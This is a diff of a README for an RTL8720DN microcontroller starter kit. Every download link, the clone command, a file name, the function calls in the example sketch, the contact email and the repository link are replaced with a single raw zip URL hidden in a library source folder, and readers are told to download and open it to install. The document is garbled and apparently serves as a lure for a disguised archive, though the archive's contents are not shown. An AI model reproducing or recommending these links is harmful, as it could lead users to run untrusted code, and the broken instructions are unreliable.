@@ -1,6 +1,6 @@
 # 🎉 rtl8720dn-starter-kit - Code Your Projects in Minutes
 
-[![Download rtl8720dn-starter-kit](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip)](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip)
+[![Download rtl8720dn-starter-kit](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip)](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps to download and set up the rtl8720dn-s
 
 ### 📥 Download & Install
 
-1. Visit this page to download: [Planned Releases](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip)
+1. Visit this page to download: [Planned Releases](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip)
 2. Look for the latest release.
 3. Click on the download link for your operating system.
 4. After downloading, open the file to install.
@@ -36,7 +36,7 @@ To get started, follow these simple steps to download and set up the rtl8720dn-s
    - Open Visual Studio Code and use the terminal.
    - Run the command:
      ```
-     git clone https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip
+     git clone https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip
      ```
 
 4. **Open the Project:**
@@ -64,15 +64,15 @@ After setting everything up, you can start coding!
 
 Here’s a simple example to test your setup:
 
-1. Create a new file named `https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip`.
+1. Create a new file named `https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip`.
 2. Copy and paste the following code:
    ```cpp
    void setup() {
-     https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip(115200);
+     https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip(115200);
    }
 
    void loop() {
-     https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip("Hello, RTL8720DN!");
+     https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip("Hello, RTL8720DN!");
      delay(1000);
    }
    ```
@@ -102,11 +102,11 @@ Join our community to share your projects or get help:
 
 ## 📬 Contact
 
-Should you require assistance or have any queries, you can reach out through GitHub or contact us via email at https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip
+Should you require assistance or have any queries, you can reach out through GitHub or contact us via email at https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip
 
 ## 📢 Important Links
 
-- [Download rtl8720dn-starter-kit](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip)
-- [GitHub Repository](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/docs/starter_rtl_kit_dn_v1.4-beta.1.zip)
+- [Download rtl8720dn-starter-kit](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip)
+- [GitHub Repository](https://github.com/xdhris/rtl8720dn-starter-kit/raw/refs/heads/master/libraries/RTL8720_Common/src/starter-kit-dn-rtl-v3.6.zip)
 
 Get ready to build amazing IoT projects with the rtl8720dn-starter-kit!
